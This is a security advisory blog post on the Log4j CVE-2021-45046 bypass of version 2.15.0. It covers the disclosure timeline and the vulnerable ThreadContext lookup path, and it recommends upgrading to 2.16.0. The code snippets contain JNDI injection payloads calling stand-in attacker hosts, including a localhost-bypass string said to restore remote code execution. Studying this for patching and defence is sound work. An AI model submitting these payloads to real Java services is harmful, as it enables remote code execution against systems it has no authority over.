_The logo gets worse as the situation gets worse..._

Earlier today, the second Log4j vulnerability (CVE-2021-45046) was upgraded from a [CVSS score of 3.7](https://web.archive.org/web/20211215180723/https://logging.apache.org/log4j/2.x/security.html)
(limited DOS) to a [CVSS score of 9.0](https://logging.apache.org/log4j/2.x/security.html) (limited RCE). Note: the reported
limited RCE has only been proven to be exploitable on macOS at the moment. We expect, in time, that other operating systems
will also be shown to be exploitable.

See the bottom of this post for an example exploit payload that bypasses the checks in log4j 2.15.0.

## Context on CVE Timeline

The Log4j team had previously released version 2.15.0 on December 6th to address, which at the time had only been
privately disclosed, the Log4Shell vulnerability that abused JNDI and LDAP to allow for an easily exploitable RCE
vulnerability. We posted a
[blog post](https://www.lunasec.io/docs/blog/log4j-zero-day/) about this new RCE that, at the time, was only being posted
about by the Chinese InfoSec community on December 9th, 2021. This post made the broader InfoSec community aware of the
ongoing exploitation and resulted in a frenzy as Java developers worked to patch themselves.

The following day, on December 10th, an official CVE was associated with this RCE vulnerability as
[CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228) with the maximum possible CVSS score of
10.0.

In the days afterwards, it was realized that this fix was incomplete as bypasses were found that could result in a
limited DOS for 2.15.0 users and, for users that had patched older Log4j releases using `formatMsgNoLookups`, these
bypasses could be used to allow for limited RCE.

Version 2.16.0 was released on December 13th to address the vulnerabilities by completely disabling JNDI by default.
The next day, on December 14th, the second vulnerability was officially given a dedicated CVE numbered CVE-2021-45046
with a limited 3.7 (now 9.0).

In this post, we're going to talk about the impact of these changes and why the CVSS score has changed so drastically.

## Understanding the new Bypass

With more attention on Log4j library now from the security community, we have seen security researchers digging into the
source code of this project. @pwntester [announced on Twitter](https://twitter.com/pwntester/status/1471465662975561734)
that there is a possible RCE still present in 2.15.0, under certain conditions.

> 2.15 with no formatMsgNoLookups mitigations is still vulnerable to RCE. 2.15.0 w/o those mitigations is vulnerable only
if attackers can control non-message parts of the pattern layout. Just to make it clear 2.15.0 disables message text lookups
by default, users need to enable them explicitly in the patterns with %m{lookups}. So mitigations are in place by default in 2.15.0

Version 2.15.0 was released in order to prevent RCE by only allowing LDAP connections to local addresses by default. This
development for the CVE means that there exists a bypass to these newly added security measures. Not everyone who has updated
to 2.15.0 is vulnerable to RCE as it requires a specific logging configuration. Since the `formatMsgNoLookups` property
is on by default in 2.15.0, to be vulnerable to this RCE, message text lookups must be manually enabled with `%m{lookups}`.

However, there even still are other ways in which a message lookup can take place. Some examples are discussed on the Log4j
security page:

> The reason these measures are insufficient is that, in addition to the Thread Context attack vector mentioned above,
there are still code paths in Log4j where message lookups could occur: known examples are applications that use
Logger.printf("%s", userInput), or applications that use a custom message factory, where the resulting messages do not
implement StringBuilderFormattable. There may be other attack vectors.

To summarize, 2.15.0 introduced changes to prevent remote connections in a message lookup (ie. a connection to `attacker.com`
will be blocked in: `${jndi:ldap://attacker.com/a}`), as well as disabled message lookups when logging by default:

```
String attackerData = "${jndi:ldap://attacker.com/a}";

// Message lookups are blocked in this log statement. Payload will not fire by default.
logger.info("Log string, but no lookup will happen: " + attackerData);
```

These changes were still not enough to prevent message lookups by default as there are other places in code where this could take place:

```
// Put attacker controlled data in
ThreadContext.put("layout-pattern-value", attackerData);
```

An example `log4j2.properties` file might look something like:

```
# The attacker data, "${jndi:ldap://attacker.com/a}", will be attempted to be looked up
appender.console.layout.pattern = ${ctx:layout-pattern-value} - %d{yyyy-MM-dd HH:mm:ss} %-5p %c{1}:%L - %m%n
```

However, since only local connections were allowed in 2.15.0, the impact of this vulnerability were minimal.
The most impactful way to exploit this vulnerability was to have `String attackerData = "${ctx:layout-pattern-value"`
which would result in a recursive reference in the lookup. With the reported bypass of the restrictive remote connection
list, a full RCE is possible in the above code as we can access `attacker.com` now.

It is strongly recommended that you update to 2.16.0, even if you have previously updated to 2.15.0, to mitigate these
new bypasses.

## Update: The localhost Bypass was Discovered!

It was [posted](https://twitter.com/marcioalm/status/1471740771581652995) on Twitter by MÃ¡rcio Almeida early on
December 17th.

This payload will bypass the network host restrictions in log4j 2.15.0 and allow full RCE again:
```
${jndi:ldap://127.0.0.1#evilhost.com:1389/a}
```

As noted in the security report, a proof of concept exploit has only been successfully executed on macOS. Considering
how many Java developers may use macOS, this is still a significant finding.

We are still investigating how to have this exploit work properly on other operating systems. It has been proposed that
[changing the default provider](https://docs.oracle.com/javase/7/docs/technotes/guides/net/properties.html#:~:text=sun.net.spi.nameservice.provider.%3Cn%3E%3D%3Cdefault%7Cdns%2Csun%7C...%3E)
to `dns,sun`:

```
System.setProperty("http://sun.net.spi.nameservice.provider.1", "dns,sun")
```

will cause the exploit to bypass the allowed hosts check in `2.15.0` properly. However, we have not been able to replicate
this yet.
